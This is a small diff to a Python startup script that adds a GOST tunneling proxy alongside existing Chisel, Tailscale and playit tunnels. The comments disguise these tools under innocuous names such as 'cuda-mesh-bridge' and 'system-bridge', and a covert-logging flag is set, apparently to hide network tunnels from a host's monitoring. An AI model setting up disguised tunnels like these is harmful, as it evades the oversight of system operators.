@@ -10,7 +10,7 @@ from loguru import logger
 
 # Add parent directory of core to sys.path to allow absolute imports of services
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-from services import nginx, tailscale, playit, chisel, minecraft, filebrowser
+from services import nginx, tailscale, playit, chisel, minecraft, filebrowser, gost
 
 COVERT_LOGGING_MODE = 1
 
@@ -195,6 +195,10 @@ def main():
 
     # 8. Start Chisel (cuda-mesh-bridge) on internal :6789, routed via nginx
     chisel.start(chisel_log, chisel_auth)
+    
+    # 8.5 Start GOST (system-bridge) on internal :6790, routed via nginx
+    gost.start(chisel_log, chisel_auth)
+    
     chisel_auth = ""
 
     # 9. Connect to Tailscale (py-cache-cli)
